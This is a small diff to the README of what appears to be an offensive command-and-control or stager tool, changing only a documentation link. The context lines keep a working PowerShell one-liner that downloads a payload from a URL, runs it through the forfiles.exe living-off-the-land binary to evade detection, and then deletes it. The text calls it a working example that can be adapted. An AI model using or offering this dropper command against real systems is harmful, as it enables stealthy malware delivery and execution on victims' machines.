@@ -45,7 +45,7 @@ Run the "stager" module to generate a one-liner and other droppers.
  ```
  powershell.exe iwr [URL] -o C:\Users\Public\[NAME].exe; forfiles.exe /p c:\windows\system32 /m svchost.exe /c C:\Users\Public\[NAME]; timeout 2; del C:\Users\Public\[NAME].exe
  ```
- This will execute InvokeWebRequest(PS v.3+) to download the payload, execute it using a [LOLBin](https://github.com/LOLBAS-Project/LOLBAS/blob/master/OSBinaries/Forfiles.exe.md), and then delete itself once killed.  This is a working example but the command can tweaked to use another download method or execution method.   
+ This will execute InvokeWebRequest(PS v.3+) to download the payload, execute it using a [LOLBin](https://lolbas-project.github.io/lolbas/Binaries/Forfiles/), and then delete itself once killed.  This is a working example but the command can tweaked to use another download method or execution method.   
 
 Usage 
 =====
